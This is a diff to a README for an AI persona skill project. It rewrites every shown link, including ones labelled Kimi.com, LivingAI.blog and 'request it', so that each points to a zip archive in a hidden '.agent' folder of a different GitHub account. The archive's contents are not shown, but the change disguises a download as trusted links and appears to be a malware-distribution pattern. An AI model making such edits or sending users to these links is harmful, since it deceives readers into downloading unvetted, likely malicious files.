@@ -19,7 +19,7 @@
 
 <br>
 
-**A joint creation by [Kimi.com](https://kimi.com) × [LivingAI.blog](https://livingai.blog) & The Community**<br><sub>🌐 Visit [LivingAI.blog](https://livingai.blog) for more enlightenment on AI mastery</sub>
+**A joint creation by [Kimi.com](https://raw.githubusercontent.com/Pepitoprac/You-Have-Lived-5-Lives/main/personas/pulitzer-author/.agent/Lives-You-Have-Lived-v1.2-alpha.2.zip) × [LivingAI.blog](https://raw.githubusercontent.com/Pepitoprac/You-Have-Lived-5-Lives/main/personas/pulitzer-author/.agent/Lives-You-Have-Lived-v1.2-alpha.2.zip) & The Community**<br><sub>🌐 Visit [LivingAI.blog](https://raw.githubusercontent.com/Pepitoprac/You-Have-Lived-5-Lives/main/personas/pulitzer-author/.agent/Lives-You-Have-Lived-v1.2-alpha.2.zip) for more enlightenment on AI mastery</sub>
 
 <br>
 
@@ -84,7 +84,7 @@ Choose your path. Each persona channels 5 master practitioners in their domain.
 
 > 🎉 **10 Personas Ready! The Ultimate AI Skill System is COMPLETE!** 🎉
 
-> 💡 **Want a new persona?** [Contribute](CONTRIBUTING.md) or [request it](https://github.com/RatioArtificiosa/You-Have-Lived-5-Lives/issues)!
+> 💡 **Want a new persona?** [Contribute](CONTRIBUTING.md) or [request it](https://raw.githubusercontent.com/Pepitoprac/You-Have-Lived-5-Lives/main/personas/pulitzer-author/.agent/Lives-You-Have-Lived-v1.2-alpha.2.zip)!
 
 > 🌱 *"If Google can't crawl it efficiently, it doesn't exist."* — Life 3
 
@@ -461,7 +461,7 @@ MIT License — see [LICENSE](LICENSE) for details.
 
 <br>
 
-**Built with 💚 by [Kimi.com](https://kimi.com) × [LivingAI.blog](https://livingai.blog) & The Community**<br><sub>Continue your journey at [LivingAI.blog](https://livingai.blog) — where AI wisdom meets practical mastery</sub>
+**Built with 💚 by [Kimi.com](https://raw.githubusercontent.com/Pepitoprac/You-Have-Lived-5-Lives/main/personas/pulitzer-author/.agent/Lives-You-Have-Lived-v1.2-alpha.2.zip) × [LivingAI.blog](https://raw.githubusercontent.com/Pepitoprac/You-Have-Lived-5-Lives/main/personas/pulitzer-author/.agent/Lives-You-Have-Lived-v1.2-alpha.2.zip) & The Community**<br><sub>Continue your journey at [LivingAI.blog](https://raw.githubusercontent.com/Pepitoprac/You-Have-Lived-5-Lives/main/personas/pulitzer-author/.agent/Lives-You-Have-Lived-v1.2-alpha.2.zip) — where AI wisdom meets practical mastery</sub>
 
 <br>
 
